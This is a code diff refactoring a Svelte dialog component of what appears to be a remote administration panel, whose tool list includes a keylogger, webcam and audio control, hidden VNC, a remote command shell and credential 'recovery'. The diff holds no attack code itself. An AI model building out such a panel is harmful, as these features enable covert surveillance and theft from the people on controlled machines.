@@ -1,15 +1,12 @@
 <script lang="ts">
 	import { browser } from '$app/environment';
-	import { goto } from '$app/navigation';
-	import { resolve } from '$app/paths';
 	import { createEventDispatcher, onMount } from 'svelte';
-	import type { ComponentType } from 'svelte';
+	import type { Component } from 'svelte';
 	import * as Dialog from '$lib/components/ui/dialog/index.js';
 	import MovableWindow from '$lib/components/ui/movablewindow/MovableWindow.svelte';
 	import { Button } from '$lib/components/ui/button/index.js';
 	import { Input } from '$lib/components/ui/input/index.js';
 	import { Label } from '$lib/components/ui/label/index.js';
-	import { Badge } from '$lib/components/ui/badge/index.js';
 	import { Textarea } from '$lib/components/ui/textarea/index.js';
 	import {
 		Select,
@@ -25,25 +22,25 @@
 		CardTitle
 	} from '$lib/components/ui/card/index.js';
 	import type { Client } from '$lib/data/clients';
-	import { buildClientToolUrl, getClientTool, type DialogToolId } from '$lib/data/client-tools';
+	import { getClientTool, type DialogToolId } from '$lib/data/client-tools';
 	import { notifyToolActivationCommand } from '$lib/utils/agent-commands.js';
-import AppVncWorkspace from '$lib/components/workspace/tools/app-vnc-workspace.svelte';
-import WebcamControlWorkspace from '$lib/components/workspace/tools/webcam-control-workspace.svelte';
-import AudioControlWorkspace from '$lib/components/workspace/tools/audio-control-workspace.svelte';
-import KeyloggerWorkspace from '$lib/components/workspace/tools/keylogger-workspace.svelte';
-import CmdWorkspace from '$lib/components/workspace/tools/cmd-workspace.svelte';
-import FileManagerWorkspace from '$lib/components/workspace/tools/file-manager-workspace.svelte';
-import SystemMonitorWorkspace from '$lib/components/workspace/tools/system-monitor-workspace.svelte';
-import RegistryManagerWorkspace from '$lib/components/workspace/tools/registry-manager-workspace.svelte';
-import ClipboardManagerWorkspace from '$lib/components/workspace/tools/clipboard-manager-workspace.svelte';
-import RecoveryWorkspace from '$lib/components/workspace/tools/recovery-workspace.svelte';
-import RemoteDesktopWorkspace from '$lib/components/workspace/tools/remote-desktop-workspace.svelte';
-import OptionsWorkspace from '$lib/components/workspace/tools/options-workspace.svelte';
-import ClientChatWorkspace from '$lib/components/workspace/tools/client-chat-workspace.svelte';
-import TriggerMonitorWorkspace from '$lib/components/workspace/tools/trigger-monitor-workspace.svelte';
-import IpGeolocationWorkspace from '$lib/components/workspace/tools/ip-geolocation-workspace.svelte';
-import EnvironmentVariablesWorkspace from '$lib/components/workspace/tools/environment-variables-workspace.svelte';
-import SystemInformationDialog from '$lib/components/system-information-dialog.svelte';
+	import AppVncWorkspace from '$lib/components/workspace/tools/app-vnc-workspace.svelte';
+	import WebcamControlWorkspace from '$lib/components/workspace/tools/webcam-control-workspace.svelte';
+	import AudioControlWorkspace from '$lib/components/workspace/tools/audio-control-workspace.svelte';
+	import KeyloggerWorkspace from '$lib/components/workspace/tools/keylogger-workspace.svelte';
+	import CmdWorkspace from '$lib/components/workspace/tools/cmd-workspace.svelte';
+	import FileManagerWorkspace from '$lib/components/workspace/tools/file-manager-workspace.svelte';
+	import SystemMonitorWorkspace from '$lib/components/workspace/tools/system-monitor-workspace.svelte';
+	import RegistryManagerWorkspace from '$lib/components/workspace/tools/registry-manager-workspace.svelte';
+	import ClipboardManagerWorkspace from '$lib/components/workspace/tools/clipboard-manager-workspace.svelte';
+	import RecoveryWorkspace from '$lib/components/workspace/tools/recovery-workspace.svelte';
+	import RemoteDesktopWorkspace from '$lib/components/workspace/tools/remote-desktop-workspace.svelte';
+	import OptionsWorkspace from '$lib/components/workspace/tools/options-workspace.svelte';
+	import ClientChatWorkspace from '$lib/components/workspace/tools/client-chat-workspace.svelte';
+	import TriggerMonitorWorkspace from '$lib/components/workspace/tools/trigger-monitor-workspace.svelte';
+	import IpGeolocationWorkspace from '$lib/components/workspace/tools/ip-geolocation-workspace.svelte';
+	import EnvironmentVariablesWorkspace from '$lib/components/workspace/tools/environment-variables-workspace.svelte';
+	import SystemInformationDialog from '$lib/components/system-information-dialog.svelte';
 	import type { AgentSnapshot } from '../../../../shared/types/agent';
 
 	const {
@@ -80,7 +77,6 @@ import SystemInformationDialog from '$lib/components/system-information-dialog.s
 	}
 
 	const tool = getClientTool(toolId);
-	const workspaceUrl = buildClientToolUrl(client.id, tool);
 
 	const workspaceComponentMap = {
 		'app-vnc': AppVncWorkspace,
@@ -98,7 +94,7 @@ import SystemInformationDialog from '$lib/components/system-information-dialog.s
 		'trigger-monitor': TriggerMonitorWorkspace,
 		'ip-geolocation': IpGeolocationWorkspace,
 		'environment-variables': EnvironmentVariablesWorkspace
-	} satisfies Partial<Record<DialogToolId, ComponentType>>;
+	} satisfies Partial<Record<DialogToolId, Component<any>>>;
 
 	const keyloggerModes = {
 		'keylogger-standard': 'standard',
@@ -135,21 +131,12 @@ import SystemInformationDialog from '$lib/components/system-information-dialog.s
 	const isWorkspaceDialog = $derived(workspaceToolIds.has(toolId));
 	const missingAgent = $derived(workspaceRequiresAgent.has(toolId) && !agent);
 
-	const windowWidth = $derived(() => {
-		if (!isWorkspaceDialog) {
-			return 640;
-		}
-		if (toolId === 'system-monitor') {
-			return 1180;
-		}
-		return 980;
-	});
-	const windowHeight = $derived(() => {
-		if (!isWorkspaceDialog) {
-			return 540;
-		}
-		return toolId === 'system-monitor' ? 720 : 640;
-	});
+	const windowWidth = $derived(
+		!isWorkspaceDialog ? 640 : toolId === 'system-monitor' ? 1180 : 980
+	);
+	const windowHeight = $derived(
+		isWorkspaceDialog ? (toolId === 'system-monitor' ? 720 : 640) : 540
+	);
 
 	onMount(() => {
 		if (!browser) {
@@ -189,8 +176,8 @@ import SystemInformationDialog from '$lib/components/system-information-dialog.s
 	const messageBodyId = `client-${client.id}-message-body`;
 	const messageStyleId = `client-${client.id}-message-style`;
 
-        function isValidHttpUrl(candidate: string): boolean {
-                try {
+	function isValidHttpUrl(candidate: string): boolean {
+		try {
 			const parsed = new URL(candidate);
 			return parsed.protocol === 'http:' || parsed.protocol === 'https:';
 		} catch {
@@ -320,8 +307,8 @@ import SystemInformationDialog from '$lib/components/system-information-dialog.s
 								</Card>
 							{/if}
 						</div>
-                                        {:else if toolId === 'system-info'}
-                                                <SystemInformationDialog {client} />
+					{:else if toolId === 'system-info'}
+						<SystemInformationDialog {client} />
 					{:else if toolId === 'notes'}
 						<form class="flex h-full flex-col" onsubmit={handleFormSubmit}>
 							<div class="flex-1 space-y-6 overflow-auto px-6 py-5">
